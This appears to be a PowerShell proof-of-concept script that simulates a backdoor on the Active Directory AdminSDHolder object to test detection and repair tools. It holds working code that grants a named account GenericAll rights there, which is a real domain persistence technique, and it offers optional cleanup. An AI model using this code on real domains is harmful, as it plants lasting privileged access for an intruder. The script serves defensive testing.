<#
.SYNOPSIS
    Simulates a temporary backdoor on AdminSDHolder for testing detection tools.

.DESCRIPTION
    Proof of Concept (PoC) script that adds a specified test account with GenericAll 
    rights on the AdminSDHolder object, simulating a real-world persistence technique.
    
    Use this to validate that Get-AdminSDHolderACL.ps1 and Repair-AdminSDHolderACL.ps1 
    correctly detect and remediate backdoors.

.PARAMETER TestAccount
    SamAccountName of the account to use as a simulated backdoor.

.PARAMETER Cleanup
    Switch to pause for testing, then automatically remove the backdoor.

.EXAMPLE
    .\Test-AdminSDHolderBackdoor.ps1 -TestAccount "testuser"

.EXAMPLE
    .\Test-AdminSDHolderBackdoor.ps1 -TestAccount "testuser" -Cleanup

.AUTHOR
    Frank Ferman
#>

param (
    [Parameter(Mandatory = $true)]
    [string]$TestAccount,
    [switch]$Cleanup
)

Import-Module ActiveDirectory

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " AdminSDHolder Backdoor PoC (Test & Validation)" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. Resolve the test account
Write-Host "`n[*] Resolving account: $TestAccount... " -NoNewline
try {
    $User = Get-ADUser -Identity $TestAccount -ErrorAction Stop
    Write-Host "Found ($($User.Name))." -ForegroundColor Green
}
catch {
    Write-Host "NOT FOUND." -ForegroundColor Red
    Write-Host "[!] The account '$TestAccount' does not exist." -ForegroundColor Red
    Exit 1
}

# 2. Get AdminSDHolder DN
$Domain = Get-ADDomain
$AdminSDHolderDN = "CN=AdminSDHolder,CN=System,$($Domain.DistinguishedName)"
Write-Host "[*] Target: $AdminSDHolderDN" -ForegroundColor Yellow

# 3. Confirmation
Write-Host "`n[!] WARNING: This will add '$($User.Name)' with GenericAll (Full Control)" -ForegroundColor Red
Write-Host "[!] on the AdminSDHolder object. This simulates a real backdoor." -ForegroundColor Red
$Confirm = Read-Host "Proceed? (Y/N)"

if ($Confirm -notmatch "^[Yy]$") {
    Write-Host "[-] Cancelled." -ForegroundColor Yellow
    Exit
}

# 4. Add the test ACL entry
Write-Host "`n[*] Adding GenericAll ACE... " -NoNewline
try {
    $ADObject = [ADSI]"LDAP://$AdminSDHolderDN"
    $ACL = $ADObject.ObjectSecurity
    $SID = New-Object System.Security.Principal.SecurityIdentifier($User.SID)
    $Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $SID,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $ACL.AddAccessRule($Rule)
    $ADObject.CommitChanges()
    Write-Host "SUCCESS." -ForegroundColor Green
}
catch {
    Write-Host "FAILED ($($_.Exception.Message))" -ForegroundColor Red
    Exit 1
}

Write-Host "`n[+] BACKDOOR SIMULATED:" -ForegroundColor Red
Write-Host "    Account : $($User.Name) ($TestAccount)" -ForegroundColor Red
Write-Host "    SID     : $($User.SID)" -ForegroundColor Red
Write-Host "    Rights  : GenericAll (Full Control)" -ForegroundColor Red

# 5. Cleanup mode
if ($Cleanup) {
    Write-Host "`n[*] -Cleanup mode enabled." -ForegroundColor Yellow
    Write-Host "[*] Run your detection scripts now (Get-AdminSDHolderACL.ps1)." -ForegroundColor Yellow
    Read-Host "Press ENTER when ready to remove the test backdoor"
    
    Write-Host "[*] Removing test ACL entry... " -NoNewline
    try {
        $ADObject = [ADSI]"LDAP://$AdminSDHolderDN"
        $ACL = $ADObject.ObjectSecurity
        $ACL.RemoveAccessRule($Rule) | Out-Null
        $ADObject.CommitChanges()
        Write-Host "REMOVED." -ForegroundColor Green
        Write-Host "[+] AdminSDHolder is clean again." -ForegroundColor Green
    }
    catch {
        Write-Host "FAILED ($($_.Exception.Message))" -ForegroundColor Red
        Write-Host "[!] Run Repair-AdminSDHolderACL.ps1 -Remediate to force cleanup." -ForegroundColor Yellow
    }
}
else {
    Write-Host "`n[i] Remember to run Repair-AdminSDHolderACL.ps1 -Remediate to clean up!" -ForegroundColor Yellow
}
